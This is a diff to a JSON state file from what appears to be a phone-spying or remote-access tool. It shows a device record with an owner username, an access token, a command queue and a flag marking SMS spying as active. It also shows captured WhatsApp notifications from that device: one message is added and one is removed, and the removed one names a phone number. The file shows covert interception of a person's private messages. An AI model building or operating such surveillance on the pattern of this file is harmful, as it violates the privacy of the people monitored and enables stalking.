@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775928591882,
+    "lastSeen": 1775928612819,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘 (2 pesan): Menyebut Anda",
+        "content": "~ INI BOT KONTOL: Welcome yang baru gabung❤️\n\nBACA BAIK BAIK JANGAN MALAS‼️\n\n`jika belum paham cara jualan apk premium cek deskripsi ada grup belajar`\n\nCara mengecek produk\n- ketik list\n- ketik apk yang mau di cek harga\n- contoh: viu . Iqiyi . Vidio\n- wajib tanya stok sebelum pembelian \n\nCara pembelian \n- ketik payment\n- gunakan payment jangan sampai salah nomor/atas atas nama siapa.jika salah = pembelian tidak berhasil di proses",
+        "time": "12/04 00:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775928592087
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘",
@@ -4115,14 +4123,6 @@
         "time": "11/04 23:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1775925130010
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke +62 895-3713-33331",
-        "time": "11/04 23:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775925129178
       }
     ],
     "galleryPhotos": [],
